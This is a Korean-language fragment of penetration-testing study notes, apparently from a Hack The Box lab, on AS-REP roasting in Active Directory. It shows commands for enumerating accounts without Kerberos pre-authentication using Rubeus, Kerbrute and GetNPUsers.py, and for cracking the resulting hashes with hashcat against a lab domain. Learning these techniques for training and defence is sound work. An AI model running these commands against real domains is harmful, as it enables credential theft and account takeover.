...
* 계정에 커버로스 사전 인증 필요없음 설정이 되어 있을 경우 암호화된 TGT를 받을 수 있음 -> 암호화된 TGT는 해시캣이나 존 더 리퍼와 같은 도구를 사용하여 오프라인 비밀번호 공격을 통해 해독 가능&#x20;

### 예시

**Get-DomainUser를 사용하여 DONT\_REQ\_PREAUTH 값에 대한 열거하기**
...
이 정보가 있을 경우 Rubeus 툴을 활용하여 AS-REP 검색 가능



**루베우스를 사용하여 적절한 형식의 AS-REP 검색하기**
...
그런 다음 모드 18200으로 해시캣을 사용하여 해시 해독 가능



**해시켓으로 오프라인에서 해시 해독하기**

```bash
realblackcat@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
...
### Kerbrute를 사용하여 AS-REP 검색

```bash
realblackcat@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
...
### Kerberoast 사전 인증이 필요하지 않은 사용자를 위한 헌팅

```bash
realblackcat@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
